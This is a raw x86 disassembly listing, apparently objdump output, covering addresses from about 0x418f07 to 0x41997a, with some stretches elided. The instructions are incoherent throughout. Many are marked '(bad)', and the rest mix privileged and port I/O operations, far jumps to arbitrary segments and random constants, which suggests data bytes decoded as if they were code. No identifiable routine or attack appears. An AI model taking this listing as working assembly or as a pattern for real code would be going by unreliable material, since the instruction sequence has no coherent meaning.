  418f07:	pavgw  mm3,QWORD PTR [ecx+0x45d256f3]
  418f0e:	dec    esp
  418f0f:	jb     0x418eb1
  418f11:	cli    
  418f12:	or     al,0x68
  418f14:	add    eax,DWORD PTR [esi+0xaa8c355]
  418f1a:	inc    ebx
  418f1b:	fs out 0x64,eax
  418f1e:	pop    es
  418f1f:	inc    ebp
  418f20:	retf   
  418f21:	xor    DWORD PTR [edx+0x52],ebp
  418f24:	aaa    
  418f25:	shl    BYTE PTR [ebx+0x2ac0bdeb],cl
  418f2b:	arpl   bp,bp
  418f2d:	pop    ebp
  418f2e:	ds mov dl,0x73
  418f31:	pushf  
  418f32:	cli    
  418f33:	sub    eax,DWORD PTR [edi+0x43]
  418f36:	push   eax
  418f37:	mov    ch,0x97
  418f39:	nop
  418f3a:	mov    esi,0x8829d1d6
  418f3f:	add    DWORD PTR [ebp+0x45],eax
  418f42:	and    al,0x1e
  418f44:	sbb    bh,bh
  418f46:	push   cs
  418f47:	in     al,0x83
  418f49:	hlt    
  418f4a:	stc    
  418f4b:	lea    esp,[eax]
  418f4d:	xlat   BYTE PTR ds:[ebx]
  418f4e:	add    edi,DWORD PTR [eax]
  418f50:	daa    
  418f51:	jle    0x418ee4
  418f53:	stc    
  418f54:	xor    DWORD PTR [edx-0x6e],eax
  418f57:	push   esi
  418f58:	mov    dl,0x3e
  418f5a:	jne    0x418edf
  418f5c:	nop
  418f5d:	dec    esi
  418f5e:	enter  0xa12f,0xcd
  418f62:	iret   
  418f63:	ins    DWORD PTR es:[edi],dx
  418f64:	leave  
  418f65:	mov    DWORD PTR [ebp+eiz*4+0x5bbd26a2],ebp
  418f6c:	sbb    BYTE PTR [edi+ebp*1],cl
  418f6f:	xchg   ebx,eax
  418f70:	mov    ebx,0x595c3020
  418f75:	inc    edi
  418f76:	(bad)  
  418f78:	mov    edx,0xfa02cf2f
  418f7d:	test   BYTE PTR [ebx-0x6eee6653],bh
  418f83:	or     DWORD PTR [edx+ebx*2],esp
  418f86:	stos   BYTE PTR es:[edi],al
  418f87:	test   DWORD PTR [ebx],ebp
  418f89:	dec    edx
  418f8a:	fistp  WORD PTR [esi+0x19]
  418f8d:	adc    al,0xf4
  418f8f:	push   ds
  418f90:	xor    eax,0x0
	...
  418ff1:	add    BYTE PTR [eax],al
  418ff3:	add    BYTE PTR [edi+edx*4],bl
  418ff6:	in     al,0x47
  418ff8:	out    dx,eax
  418ff9:	ja     0x418fba
  418ffb:	fild   WORD PTR [ecx-0x48150e59]
  419001:	lds    esi,FWORD PTR [edx-0x24]
  419004:	jmp    0x1:0x5000108
  41900b:	add    BYTE PTR [esi-0x568f7526],dl
  419011:	hlt    
  419012:	int3   
  419013:	cmp    al,0x39
  419015:	cmp    esp,DWORD PTR [ecx-0x68]
  419018:	mov    dh,0xb0
  41901a:	xor    dl,BYTE PTR [ecx+0x32]
  41901d:	outs   dx,BYTE PTR ds:[esi]
  41901e:	call   0xe425:0xf85efcf3
  419025:	pop    ebp
  419026:	scas   eax,DWORD PTR es:[edi]
  419027:	pusha  
  419028:	scas   eax,DWORD PTR es:[edi]
  419029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41902a:	fwait
  41902b:	sar    BYTE PTR [edi],cl
  41902d:	outs   dx,BYTE PTR es:[esi]
  41902f:	mov    ds:0xa685ef9f,al
  419034:	test   BYTE PTR [esi],bh
  419036:	or     eax,0x3a750a4a
  41903b:	fcom   QWORD PTR ss:[ecx+ebx*2]
  41903f:	stos   DWORD PTR es:[edi],eax
  419040:	gs inc edi
  419042:	repz xchg esp,eax
  419044:	fisubr DWORD PTR [esi+0x7]
  419047:	loope  0x41904b
  419049:	fidiv  WORD PTR [esi+0x20acb39d]
  41904f:	mov    edi,esi
  419051:	or     eax,0x97ca279a
  419056:	mov    al,ds:0x28fc603f
  41905b:	inc    ebx
  41905c:	mov    ds:0xbb521ebd,al
  419061:	dec    esi
  419062:	aas    
  419063:	sahf   
  419064:	push   esp
  419065:	fwait
  419066:	sbb    eax,DWORD PTR [eax]
  419068:	and    BYTE PTR [edx-0xbec848a],0xfe
  41906f:	sbb    DWORD PTR [edx+esi*4-0x6d],edx
  419073:	add    ah,BYTE PTR [esi+0x3d]
  419076:	xor    DWORD PTR [edx-0x32],0x71b8240c
  41907d:	and    bl,ah
  41907f:	dec    esp
  419080:	icebp  
  419081:	shl    DWORD PTR [eax+0x3d41e4ee],0x76
  419088:	inc    edx
  419089:	test   al,0x6d
  41908b:	or     esp,DWORD PTR [edi-0x1c]
  41908e:	xor    eax,0x9b3257d7
  419093:	(bad)  
  419094:	test   eax,0x7417b2a4
  419099:	in     al,dx
  41909a:	sub    BYTE PTR [edi],ch
  41909c:	pop    ecx
  41909d:	rol    BYTE PTR [edx+0x5a023b60],0x2a
  4190a4:	adc    DWORD PTR [ecx],ecx
  4190a6:	int3   
  4190a7:	(bad)  
  4190a8:	mov    dl,0x32
  4190aa:	add    ch,dh
  4190ac:	cli    
  4190ad:	imul   esi,ebp,0x1c
  4190b0:	push   eax
  4190b1:	mov    al,0x75
  4190b3:	xchg   edx,eax
  4190b4:	cmp    DWORD PTR [ecx],ecx
  4190b6:	ds ins BYTE PTR es:[edi],dx
  4190b8:	xor    BYTE PTR [edi-0x48],bh
  4190bb:	clc    
  4190bc:	adc    BYTE PTR [ebx+0x5e],cl
  4190bf:	add    bh,BYTE PTR [eax-0x2ed411be]
  4190c5:	bnd ja 0x4190e6
  4190c8:	mov    bh,BYTE PTR [esi+ebx*8+0x4f]
  4190cc:	fwait
  4190cd:	mov    ebx,0xed71a661
  4190d2:	mov    gs,edi
  4190d4:	in     al,0x0
  4190d6:	add    DWORD PTR [ebx+0x52],ebp
  4190d9:	or     eax,0x3b26761c
  4190de:	jmp    0x1bf422e7
  4190e3:	mov    ecx,0x71397db2
  4190e8:	fs pop eax
  4190ea:	push   cs
  4190eb:	es dec ebp
  4190ed:	rcr    ebp,0x5a
  4190f0:	lea    edx,[esi-0x5e0c6d48]
  4190f6:	aas    
  4190f7:	ins    DWORD PTR es:[edi],dx
  4190f8:	nop
  4190f9:	xor    dh,cl
  4190fb:	jle    0x419147
  4190fd:	adc    BYTE PTR [edi+0x3b],dl
  419100:	xor    ebx,DWORD PTR [eax-0x4a]
  419103:	mov    esp,0xb9f85621
  419108:	ds push 0x5b
  41910b:	xor    eax,0xd873b05c
  419110:	sbb    al,BYTE PTR [eax]
	...
  419172:	add    BYTE PTR [eax],al
  419174:	scas   eax,DWORD PTR es:[edi]
  419175:	test   DWORD PTR [esi-0xa441be],ebx
  41917b:	in     eax,dx
  41917c:	inc    esi
  41917d:	push   0x4d
  41917f:	or     dh,BYTE PTR [esi]
  419181:	xchg   edx,eax
  419182:	sub    dl,al
  419184:	out    dx,eax
  419185:	or     DWORD PTR [ecx],eax
  419187:	add    BYTE PTR ds:0x87000001,al
  41918d:	loopne 0x4191fb
  41918f:	cmp    BYTE PTR [ebp-0x23394f92],cl
  419195:	cmp    ah,BYTE PTR [ebp-0x71]
  419198:	and    esp,DWORD PTR [esp+eiz*2]
  41919b:	sahf   
  41919c:	leave  
  41919d:	imul   esp,DWORD PTR [eax+edi*4],0x47
  4191a1:	test   DWORD PTR [eax+0x688068e3],ebx
  4191a7:	gs cdq 
  4191a9:	push   edi
  4191aa:	in     al,0xad
  4191ac:	dec    edx
  4191ad:	ror    BYTE PTR [edx-0x60667304],1
  4191b3:	hlt    
  4191b4:	pusha  
  4191b5:	jecxz  0x4191c0
  4191b7:	stos   DWORD PTR es:[edi],eax
  4191b8:	fstp   QWORD PTR ds:0x8ced89b4
  4191be:	mov    eax,0x12ffd700
  4191c3:	cwde   
  4191c4:	jmp    0x3e15:0x67d5105
  4191cb:	push   es
  4191cc:	jle    0x41919b
  4191ce:	enter  0x9f66,0x51
  4191d2:	adc    al,0xcd
  4191d4:	inc    ebx
  4191d5:	or     al,0x19
  4191d7:	and    BYTE PTR [esp],0xb1
  4191db:	call   0x3918:0xcd3864b5
  4191e2:	rcl    DWORD PTR [ebx],1
  4191e4:	mov    edx,0x63596344
  4191e9:	in     al,0xd5
  4191eb:	sbb    ebp,edx
  4191ed:	mov    edi,0x95258a49
  4191f2:	ror    DWORD PTR [eax],cl
  4191f4:	out    0x8a,al
  4191f6:	dec    eax
  4191f7:	or     DWORD PTR [ebx+0x5d],eax
  4191fa:	ret    
  4191fb:	imul   ebp,edi,0x9920654b
  419201:	push   ebp
  419202:	ror    DWORD PTR [ecx],1
  419204:	xchg   ebx,eax
  419205:	jle    0x419256
  419207:	pop    esi
  419208:	jp     0x4191a8
  41920a:	scas   al,BYTE PTR es:[edi]
  41920b:	sbb    ebp,DWORD PTR [esi+0x76]
  41920e:	outs   dx,BYTE PTR ds:[esi]
  41920f:	inc    edx
  419210:	jns    0x419263
  419212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419213:	add    DWORD PTR [ebx+0x31],eax
  419216:	xor    eax,0x139e0782
  41921b:	test   eax,0x5b0012a7
  419220:	jmp    0x84eeff55
  419225:	adc    ah,BYTE PTR [edx-0x24]
  419228:	cmp    eax,ebp
  41922a:	fs jno 0x4192a0
  41922d:	mov    al,ds:0xeffbf9e4
  419232:	in     al,dx
  419233:	xchg   edx,eax
  419234:	cwde   
  419235:	imul   ecx,DWORD PTR [ebx+0x73],0x88f47784
  41923c:	pop    ecx
  41923d:	sahf   
  41923e:	or     DWORD PTR [esi],edi
  419240:	test   BYTE PTR [ecx+0x18],ah
  419243:	and    ebx,DWORD PTR [edi]
  419245:	or     eax,0x3a7b95ac
  41924a:	and    esp,ecx
  41924c:	mov    eax,ds:0x7f0e02e0
  419251:	cmovg  ebp,DWORD PTR [ebp-0x75db8d54]
  419258:	jae    0x4192a7
  41925a:	(bad)  ds:0xe79b1e37
  419260:	mov    ds:0x779faf16,eax
  419265:	addr16 ja 0x419280
  419268:	mov    ds:0x5d33b348,al
  41926d:	out    dx,eax
  41926e:	fs aaa 
  419270:	aas    
  419271:	into   
  419272:	xchg   ecx,eax
  419273:	loopne 0x4192e9
  419275:	test   eax,0x472d8f65
  41927a:	pop    ds
  41927b:	icebp  
  41927c:	(bad)  
  41927d:	aaa    
  41927e:	mov    esi,DWORD PTR [edx+0x5a2773ec]
  419284:	adc    BYTE PTR [eax],cl
  419286:	paddsw mm6,QWORD PTR [ebp+edx*4+0x5387a829]
  41928e:	add    al,0xf3
  419290:	iret   
	...
  4192f1:	add    BYTE PTR [eax],al
  4192f3:	add    BYTE PTR [eax-0xcc4519],ah
  4192f9:	jg     0x4192a4
  4192fb:	neg    eax
  4192fd:	pop    ss
  4192fe:	daa    
  4192ff:	inc    edi
  419300:	(bad)  
  419301:	icebp  
  419302:	xchg   bh,bl
  419304:	hlt    
  419305:	or     al,BYTE PTR [ecx]
  419307:	add    BYTE PTR ds:0xcf000001,al
  41930d:	leave  
  41930e:	je     0x419360
  419310:	lods   eax,DWORD PTR ds:[esi]
  419311:	mov    bl,0xe2
  419313:	(bad)  [eax]
  419315:	pop    ebp
  419316:	out    0xc3,eax
  419318:	adc    cl,al
  41931a:	daa    
  41931b:	lods   al,BYTE PTR ds:[esi]
  41931c:	addr16 mov dl,0xe7
  41931f:	xchg   edx,eax
  419320:	les    esp,FWORD PTR [eax+0x2b]
  419323:	fidivr DWORD PTR [esi+ecx*2]
  419326:	fst    DWORD PTR ds:0x77770855
  41932c:	test   eax,0xf9c5fb30
  419331:	sub    BYTE PTR [edx],al
  419333:	gs daa 
  419335:	repnz push ecx
  419337:	sub    al,0xbb
  419339:	xor    al,0x79
  41933b:	adc    eax,0xda179071
  419340:	sub    ch,BYTE PTR [ebx+0x79]
  419343:	ret    0xd692
  419346:	push   DWORD PTR [ebp-0x53]
  419349:	test   ah,al
  41934b:	mov    edi,0xa43ff6a1
  419350:	loope  0x41933f
  419352:	sti    
  419353:	pop    es
  419354:	sahf   
  419355:	ss pop ebx
  419357:	mov    cl,0xd
  419359:	repz in eax,0xce
  41935c:	xchg   ebx,eax
  41935d:	mov    ebp,0xc1296411
  419362:	loopne 0x4193a1
  419364:	inc    ebx
  419365:	push   0x51
  419367:	mov    dl,BYTE PTR [ebx+0x52]
  41936a:	dec    esp
  41936b:	jb     0x419347
  41936d:	call   0x3dac:0xd4fcb5d7
  419374:	lods   eax,DWORD PTR ds:[esi]
  419375:	dec    ebp
  419376:	outs   dx,BYTE PTR gs:[esi]
  419378:	inc    esi
  419379:	dec    edx
  41937a:	lods   eax,DWORD PTR ds:[esi]
  41937b:	lea    ecx,[ecx-0x18]
  41937e:	enter  0xf42e,0xfd
  419382:	xchg   ecx,eax
  419383:	clc    
  419384:	push   ebp
  419385:	mov    bh,0xd2
  419387:	pop    esi
  419388:	je     0x4193da
  41938a:	lods   eax,DWORD PTR ds:[esi]
  41938b:	sub    bl,BYTE PTR [esi]
  41938d:	inc    edx
  41938e:	fwait
  41938f:	pop    edi
  419390:	sbb    eax,0xa8f09cdd
  419395:	aas    
  419396:	mov    eax,0xa9b09448
  41939b:	inc    edi
  41939c:	retf   0xbc0
  41939f:	inc    BYTE PTR [ecx]
  4193a1:	sub    al,0x36
  4193a3:	sbb    DWORD PTR [edi+0x1c],edi
  4193a6:	xor    DWORD PTR [esp+ebp*4-0x2e42ec6b],ebp
  4193ad:	outs   dx,BYTE PTR ds:[esi]
  4193ae:	ret    
  4193af:	dec    edx
  4193b0:	push   cs
  4193b1:	mov    edx,0x44e2b335
  4193b6:	pop    esi
  4193b7:	pop    ss
  4193b8:	inc    esi
  4193b9:	xor    edi,esi
  4193bb:	push   0xffffffcd
  4193bd:	or     bl,BYTE PTR [esi]
  4193bf:	ret    0xcebd
  4193c2:	cmp    esp,edx
  4193c4:	out    dx,al
  4193c5:	add    eax,0x91af4174
  4193ca:	xchg   BYTE PTR [eax-0x27],al
  4193cd:	add    eax,edi
  4193cf:	pop    edx
  4193d0:	mov    eax,ds:0xc5d0eaa3
  4193d5:	sub    eax,DWORD PTR [ebx]
  4193d7:	add    BYTE PTR [eax],0xb3
  4193da:	ja     0x419360
  4193dc:	mov    esp,0x930196b3
  4193e1:	test   al,0xbd
  4193e3:	add    eax,0x139c2630
  4193e8:	int3   
  4193e9:	rcr    dh,cl
  4193eb:	mov    edi,ss
  4193ed:	inc    edx
  4193ee:	cmp    DWORD PTR [edi+0x71594cb7],esp
  4193f4:	call   FWORD PTR [eax]
  4193f6:	into   
  4193f7:	xor    esi,edi
  4193f9:	ror    BYTE PTR [ecx+0x28],cl
  4193fc:	arpl   WORD PTR ds:0xc9e3c46c,bx
  419402:	pusha  
  419403:	push   ecx
  419404:	fimul  DWORD PTR [edi+0x71963ac8]
  41940a:	loopne 0x4193aa
  41940c:	data16 hlt 
  41940e:	jnp    0x419450
  419410:	call   0x0:0x0
	...
  419473:	add    BYTE PTR ds:0xed3a6998,bh
  419479:	sti    
  41947a:	jg     0x41941b
  41947c:	cmp    ebx,esi
  41947e:	je     0x419446
  419480:	inc    BYTE PTR [eax-0x79]
  419483:	scas   eax,DWORD PTR es:[edi]
  419484:	stc    
  419485:	or     eax,DWORD PTR [ecx]
  419487:	add    BYTE PTR ds:0x9c000001,al
  41948d:	mov    esi,0x2c0bdde1
  419492:	(bad)  
  419493:	pop    ebp
  419494:	dec    edx
  419495:	push   ds
  419496:	xor    cl,cl
  419498:	xor    DWORD PTR [ebp-0x7d],edi
  41949b:	pop    esp
  41949c:	inc    ecx
  41949d:	inc    esp
  41949e:	sbb    DWORD PTR [edx-0x27],edi
  4194a1:	add    al,0xa1
  4194a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194a4:	inc    ebp
  4194a5:	push   eax
  4194a6:	mov    bl,0x1e
  4194a8:	rcr    BYTE PTR [edi],0x4e
  4194ab:	mov    ah,0x91
  4194ad:	sub    ecx,esp
  4194af:	int3   
  4194b0:	leave  
  4194b1:	push   ss
  4194b2:	push   cs
  4194b3:	mov    WORD PTR [edi-0x10],?
  4194b6:	neg    DWORD PTR [esi]
  4194b8:	cld    
  4194b9:	dec    ebp
  4194ba:	mov    dl,bh
  4194bc:	jb     0x41944f
  4194be:	(bad)  
  4194bf:	xor    esp,DWORD PTR [ebp+0x49]
  4194c2:	int3   
  4194c3:	ficomp DWORD PTR [edx]
  4194c5:	pop    edi
  4194c6:	ret    0x73a0
  4194c9:	pop    ss
  4194ca:	pop    edx
  4194cb:	(bad)  
  4194cc:	fsub   DWORD PTR [ebx+0x4d]
  4194cf:	mov    bh,0x3
  4194d1:	(bad)  
  4194d2:	imul   esp,DWORD PTR [esp+ebp*2],0x72
  4194d6:	dec    eax
  4194d7:	call   0xcc8d087d
  4194dc:	pop    edx
  4194dd:	pop    eax
  4194de:	into   
  4194df:	add    esp,esi
  4194e1:	fbld   TBYTE PTR [ebp+0x19586df]
  4194e7:	popf   
  4194e8:	dec    dh
  4194ea:	jbe    0x4194b5
  4194ec:	(bad)  
  4194ed:	mov    ch,0x22
  4194ef:	aas    
  4194f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194f1:	sub    esi,ecx
  4194f3:	inc    esi
  4194f4:	retf   0x5b25
  4194f7:	outs   dx,BYTE PTR ds:[esi]
  4194f8:	sbb    DWORD PTR [esi-0x63],ebp
  4194fb:	es ret 0x38e3
  4194ff:	jecxz  0x41957a
  419501:	scas   eax,DWORD PTR es:[edi]
  419502:	mov    ecx,0x95f7e657
  419507:	stos   DWORD PTR es:[edi],eax
  419508:	mov    cl,0x26
  41950a:	imul   edi,DWORD PTR [edi],0x53
  41950d:	fcomi  st,st(3)
  41950f:	xchg   edi,eax
  419510:	sub    eax,esp
  419512:	test   eax,0xcc380013
  419517:	lea    ebp,ds:0x85b113dc
  41951d:	mov    ebx,0x4f6fb966
  419522:	ds dec esi
  419524:	adc    al,0x3f
  419526:	push   esi
  419527:	xchg   ebx,eax
  419528:	xor    edi,DWORD PTR [ebp-0x6c]
  41952b:	inc    ebx
  41952c:	lahf   
  41952d:	(bad)  
  41952e:	clc    
  41952f:	dec    edx
  419530:	fcom   QWORD PTR [ebp-0x5001c121]
  419536:	es jo  0x4194d8
  419539:	jg     0x419547
  41953b:	xor    al,0xfb
  41953d:	js     0x41953d
  41953f:	aas    
  419540:	mov    edi,0x1016a7f9
  419545:	dec    ecx
  419546:	inc    esi
  419547:	xlat   BYTE PTR ds:[ebx]
  419548:	xchg   esi,eax
  419549:	arpl   WORD PTR [edi],ax
  41954b:	jg     0x41952c
  41954d:	adc    DWORD PTR [edi-0x4a14221f],ecx
  419553:	and    edx,DWORD PTR ds:0x61378ab9
  419559:	jl     0x41954f
  41955b:	pop    edi
  41955c:	(bad)  
  41955d:	and    al,0x9a
  41955f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419560:	test   eax,0xcfc0b1f3
  419565:	push   eax
  419566:	daa    
  419567:	mov    eax,0x22a22332
  41956c:	mov    dh,0x47
  41956e:	repnz dec esp
  419570:	jno    0x419570
  419572:	loop   0x41958f
  419574:	pop    es
  419575:	push   esi
  419576:	pop    ebp
  419577:	pop    eax
  419578:	dec    esp
  419579:	rol    ebp,1
  41957b:	aad    0x59
  41957d:	gs mov edx,eax
  419580:	lods   al,BYTE PTR ds:[esi]
  419581:	mov    eax,ds:0xf4d6feab
  419586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419587:	cmp    eax,DWORD PTR [edi+0x3d158e]
  41958d:	add    DWORD PTR [esi+0x75],0x27
	...
  4195f1:	add    BYTE PTR [eax],al
  4195f3:	add    BYTE PTR [edi-0x9d722c],ch
  4195f9:	jnp    0x4195ea
  4195fb:	fstp   st(1)
  4195fd:	fcomp  QWORD PTR [ebx+0x2f]
  419600:	jmp    0xfeae2ba4
  419605:	or     al,0x1
  419607:	add    BYTE PTR ds:0x18000001,al
  41960d:	and    esp,DWORD PTR [ebp+0x2]
  419610:	or     al,0x2e
  419612:	iret   
  419613:	adc    DWORD PTR [ebx+0x6e],esp
  419616:	iret   
  419617:	mov    al,ds:0x6ecffd56
  41961c:	repz out 0x36,eax
  41961f:	ds xor eax,0xd78fa800
  419625:	imul   esp,DWORD PTR [eax-0x7a],0xffffff95
  419629:	pop    es
  41962a:	inc    esi
  41962b:	inc    esp
  41962c:	outs   dx,DWORD PTR ds:[esi]
  41962d:	xchg   ecx,eax
  41962e:	sbb    al,0x1a
  419630:	cwde   
  419631:	mov    eax,0xef25146b
  419636:	jo     0x419670
  419638:	jmp    0x4195db
  41963a:	fwait
  41963b:	mov    bl,0x13
  41963d:	xor    ecx,DWORD PTR [ecx]
  41963f:	hlt    
  419640:	nop
  419641:	ret    
  419642:	push   edi
  419643:	dec    esi
  419644:	xor    al,al
  419646:	add    al,0xdb
  419648:	cmp    bh,bl
  41964a:	jecxz  0x4196c5
  41964c:	mov    al,ds:0x3497703b
  419651:	pop    ebx
  419652:	stos   DWORD PTR es:[edi],eax
  419653:	mov    ah,0xb6
  419655:	mov    bh,0xd2
  419657:	cmp    eax,0x34fd2ce
  41965c:	out    dx,eax
  41965d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41965e:	push   edi
  41965f:	aaa    
  419660:	sbb    BYTE PTR [ebx],ah
  419662:	mov    eax,0x44b1f308
  419667:	fsubr  DWORD PTR [ebp+0x7c5143a7]
  41966d:	sahf   
  41966e:	jne    0x419614
  419670:	push   ecx
  419671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419672:	and    dh,al
  419674:	out    0x1a,eax
  419676:	inc    esi
  419677:	retf   
  419678:	test   bl,0xb5
  41967b:	xlat   BYTE PTR ds:[ebx]
  41967c:	add    BYTE PTR [eax],cl
  41967e:	test   al,0xdc
  419680:	scas   eax,DWORD PTR es:[edi]
  419681:	mov    eax,ds:0x78bfbca1
  419686:	lea    eax,[edi+0x600e9fd2]
  41968c:	rcl    DWORD PTR [ebp-0x53],1
  41968f:	jg     0x419661
  419691:	aad    0x3d
  419693:	shl    DWORD PTR [eax+0x21],cl
  419696:	fcomi  st,st(4)
  419698:	adc    cl,BYTE PTR [eax-0x1a]
  41969b:	jo     0x419651
  41969d:	dec    ebp
  41969e:	int3   
  41969f:	or     eax,0x13271b1
  4196a4:	test   DWORD PTR [esi+0x2f],ecx
  4196a7:	ins    BYTE PTR es:[edi],dx
  4196a8:	std    
  4196a9:	sub    eax,0x90a7b12e
  4196ae:	(bad)  
  4196af:	int    0x73
  4196b1:	cmp    eax,0xdf8b6357
  4196b6:	cld    
  4196b7:	pop    ebp
  4196b8:	lods   eax,DWORD PTR ds:[esi]
  4196b9:	sub    DWORD PTR [edx-0x2916c676],edi
  4196bf:	or     DWORD PTR [ebx+0x17ddee81],ebx
  4196c5:	mov    BYTE PTR [ebp-0x2d],bh
  4196c8:	jo     0x419727
  4196ca:	xor    eax,0x124125f5
  4196cf:	add    DWORD PTR [edx],0xffffffe5
  4196d2:	loope  0x4196fb
  4196d4:	je     0x4196be
  4196d6:	iret   
  4196d7:	out    0xcb,al
  4196d9:	andnps xmm0,XMMWORD PTR [eax]
  4196dc:	mov    ah,0x6c
  4196de:	jno    0x419746
  4196e0:	sti    
  4196e1:	add    eax,0x1c4433fe
  4196e6:	mov    bh,0xe4
  4196e8:	shl    DWORD PTR [edi],0xa6
  4196eb:	dec    ebx
  4196ec:	add    al,0x46
  4196ee:	addr16 enter 0x1698,0xd2
  4196f3:	mov    edx,0x46ff546b
  4196f8:	sub    eax,DWORD PTR [ebx-0x4f]
  4196fb:	clc    
  4196fc:	jae    0x4196b1
  4196fe:	dec    edi
  4196ff:	add    eax,0xcd0e747d
  419704:	out    dx,al
  419705:	aad    0x60
  419707:	mov    ah,0x3e
  419709:	outs   dx,BYTE PTR ds:[esi]
  41970a:	dec    ecx
  41970b:	xlat   BYTE PTR ds:[ebx]
  41970c:	mov    ds:0x6bd95396,eax
	...
  419771:	add    BYTE PTR [eax],al
  419773:	add    BYTE PTR [ebx-0x29a8ec1],dh
  419779:	outs   dx,DWORD PTR ds:[esi]
  41977a:	mov    bh,0xff
  41977c:	add    eax,0x228dd0ae
  419781:	pop    ss
  419782:	call   0x500:0x10e03ba
  419789:	add    DWORD PTR [eax],eax
  41978b:	add    BYTE PTR [ebx-0x65],dh
  41978e:	inc    esp
  41978f:	xor    esp,DWORD PTR [ebp+0x4ffa1d25]
  419795:	sbb    esp,DWORD PTR [ecx-0x636383c6]
  41979b:	pop    es
  41979c:	lods   al,BYTE PTR ds:[esi]
  41979d:	jg     0x419775
  41979f:	and    al,0x6e
  4197a1:	pop    eax
  4197a2:	and    BYTE PTR [edx+0x211af3e0],0x5
  4197a9:	pop    es
  4197aa:	sbb    DWORD PTR [esi],eax
  4197ac:	jb     0x4197dc
  4197ae:	mov    dh,0x97
  4197b0:	cmp    al,0xa
  4197b2:	pop    ebx
  4197b3:	add    esp,edi
  4197b5:	mov    dh,0x33
  4197b7:	jo     0x4197df
  4197b9:	jo     0x419763
  4197bb:	jae    0x419768
  4197bd:	mov    ds:0x41f8347d,al
  4197c2:	pop    ebx
  4197c3:	jl     0x4197fc
  4197c5:	inc    edx
  4197c6:	fdiv   DWORD PTR [ebx-0x80]
  4197c9:	enter  0x1976,0xdf
  4197cd:	mov    dh,0x66
  4197cf:	xchg   ebp,ebp
  4197d1:	or     bh,BYTE PTR [edi-0x306c2a5b]
  4197d7:	iret   
  4197d8:	ror    BYTE PTR ds:0xe61d72cf,0x56
  4197df:	clc    
  4197e0:	jno    0x419856
  4197e2:	inc    esi
  4197e3:	add    eax,0xcad5bc9c
  4197e8:	test   BYTE PTR [ecx-0x57e225c0],cl
  4197ee:	sub    al,0x8f
  4197f0:	ret    0xccfe
  4197f3:	adc    ebp,DWORD PTR [ecx-0x5ebb13d4]
  4197f9:	(bad)  [edx-0xacd12cc]
  4197ff:	mov    eax,ds:0xb26ac7f8
  419804:	mov    ah,0x51
  419806:	imul   edx,DWORD PTR [edi+0x56],0x3
  41980a:	jns    0x4197e9
  41980c:	ds inc edi
  41980e:	jmp    0x2b91:0x8a18a00a
  419815:	sbb    DWORD PTR [ecx-0x4a],ecx
  419818:	mov    edi,0x161e178a
  41981d:	test   ebx,esp
  41981f:	ret    
  419820:	shr    BYTE PTR [esi],0xc1
  419823:	data16 fs in al,0x17
  419827:	or     eax,0xd623bff5
  41982c:	pusha  
  41982d:	xor    ah,BYTE PTR [ecx+0x39]
  419830:	sub    esi,DWORD PTR ds:0x2e1d7dc2
  419836:	adc    ebp,DWORD PTR [eax]
  419838:	sbb    DWORD PTR [eax+0xbaf0220],0xffffffdd
  41983f:	adc    BYTE PTR [edi-0x4f567732],cl
  419845:	cld    
  419846:	inc    ebx
  419847:	and    ch,BYTE PTR [edx+0x259bf9e6]
  41984d:	and    BYTE PTR ds:0xa6cb1cb3,dl
  419853:	cmp    dh,BYTE PTR [ebx+0x3e]
  419856:	fwait
  419857:	and    eax,0x2d7e7750
  41985c:	les    edx,FWORD PTR [ebx+edx*8+0x54931ad2]
  419863:	adc    al,bh
  419865:	pop    es
  419866:	fisttp QWORD PTR [edx]
  419868:	mov    bl,0x49
  41986a:	aam    0xdf
  41986c:	push   ecx
  41986d:	pusha  
  41986e:	aam    0x61
  419870:	out    dx,al
  419871:	mov    edi,0x16c77d80
  419876:	xor    eax,0x424f32c8
  41987b:	fwait
  41987c:	stos   DWORD PTR es:[edi],eax
  41987d:	test   al,0xf1
  41987f:	(bad)  
  419880:	dec    eax
  419881:	jae    0x4198aa
  419883:	xchg   DWORD PTR [edi+0x771a1cb3],esi
  419889:	sbb    BYTE PTR [ecx],bl
  41988b:	icebp  
  41988c:	mov    cl,0x35
  41988e:	pop    esp
  41988f:	xchg   ebp,eax
  419890:	out    dx,eax
	...
  4198f1:	add    BYTE PTR [eax],al
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fucom  st(5)
  419901:	retf   0xe2ff
  419904:	or     BYTE PTR [edi],cl
  419906:	add    DWORD PTR [eax],eax
  419908:	add    eax,0xff000001
  41990d:	in     eax,dx
  41990e:	xchg   edi,eax
  41990f:	cdq    
  419910:	adc    dh,BYTE PTR [edx+eax*8]
  419913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419914:	adc    edi,esp
  419916:	in     eax,dx
  419917:	shl    DWORD PTR [ebx],1
  419919:	aas    
  41991a:	jmp    0xb3b9:0x33a677ac
  419921:	loop   0x419920
  419923:	sbb    al,0x94
  419925:	push   edi
  419926:	inc    ebp
  419927:	daa    
  419928:	inc    esi
  41992a:	leave  
  41992b:	add    al,0xb8
  41992d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41992f:	and    al,0x42
  419931:	mov    bh,0xf
  419933:	daa    
  419934:	lock pushf 
  419936:	pop    ds
  419937:	imul   ecx,edx,0x8a61b47b
  41993d:	ret    0xe607
  419940:	adc    DWORD PTR [eax+edx*2-0x6c115cea],eax
  419947:	inc    DWORD PTR [ebx+eax*1-0xa]
  41994b:	call   0x53f62d20
  419950:	rcl    ch,0xcb
  419953:	mov    dh,0xe0
  419955:	imul   ebx,DWORD PTR [eax+0x381e0a80],0xffffffa0
  41995c:	jmp    0x419967
  41995e:	fld    QWORD PTR [ecx-0x11bb8eb9]
  419964:	and    al,0x3a
  419966:	fwait
  419967:	or     ch,BYTE PTR [eax-0x777d78f6]
  41996d:	lds    ebp,FWORD PTR [esi+0x2d]
  419970:	push   ss
  419971:	or     bh,ch
  419973:	lods   al,BYTE PTR ds:[esi]
  419974:	icebp  
  419975:	loope  0x41990e
  419977:	in     eax,0xfc
  419979:	dec    edi
  41997a:	out    0x8e,al
